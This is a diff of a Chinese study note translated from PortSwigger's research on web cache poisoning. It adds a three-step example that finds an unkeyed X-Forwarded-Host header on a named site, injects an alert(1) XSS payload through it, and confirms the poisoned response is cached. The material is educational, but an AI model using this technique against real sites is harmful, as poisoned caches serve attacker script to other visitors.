@@ -1,3 +1,4 @@
+> 本文 翻译整理自[实用的web缓存中毒](https://portswigger.net/research/practical-web-cache-poisoning)，记录仅作个人学习使用，侵删
 ## 核心概念
 ### Caching 101
 Web缓存位于用户和应用程序服务器之间，它们保存和提供某些响应的副本。在下图中，我们可以看到三个用户一个接一个地获取相同的资源：
@@ -54,8 +55,40 @@ Web缓存中毒的目的是发送导致有害响应的请求，这些响应被�
 4. ~~当审核一个实时网站时，意外地毒害其他访问者是一个永久的危险。Param Miner通过向Burp的所有出站请求添加缓存破坏器来缓解此问题。这个缓存buster有一个固定的值，因此您可以自己观察缓存行为，而不会影响其他用户。~~
 
 ### Basic Poisoning
+1. 找到非键控输入
+```code
+GET /en?cb=1 HTTP/1.1  
+Host: www.redhat.com  
+X-Forwarded-Host:      **canary** 
+  
+HTTP/1.1 200 OK  
+Cache-Control: public, no-cache  
+…  
+<meta property="og:image" content="https://  **canary **  /cms/social.png" />
+```
+2. 评估是否可利用
+```code
+GET /en?dontpoisoneveryone=1 HTTP/1.1  
+Host: www.redhat.com  
+X-Forwarded-Host:     **a."><script>alert(1)</script> **
+  
+HTTP/1.1 200 OK  
+Cache-Control: public, no-cache  
+…  
+<meta property="og:image" content="https://   **a."><script>alert(1)</script>**  "/>
+```
+3. 检查此响应是否已存储在缓存中，以便将其传递给其他用户
+```code
+GET /en?dontpoisoneveryone=1 HTTP/1.1  
+Host: www.redhat.com  
+  
+HTTP/1.1 200 OK  
+…  
+<meta property="og:image" content="https://a."><script>alert(1)</script>"/>
+```
 
-<code>GET /en?cb=1 HTTP/1.1<br>Host: www.redhat.com<br>X-Forwarded-Host: <span class="orange">canary</span><br><br>HTTP/1.1 200 OK<br>Cache-Control: public, no-cache<br>…<br>&lt;meta property="og:image" content="https://<span class="orange">canary</span>/cms/social.png" /&gt;</code>
+### Discreet poisoning
+
 
 ## Tools
 [Param Miner](https://github.com/PortSwigger/param-miner)
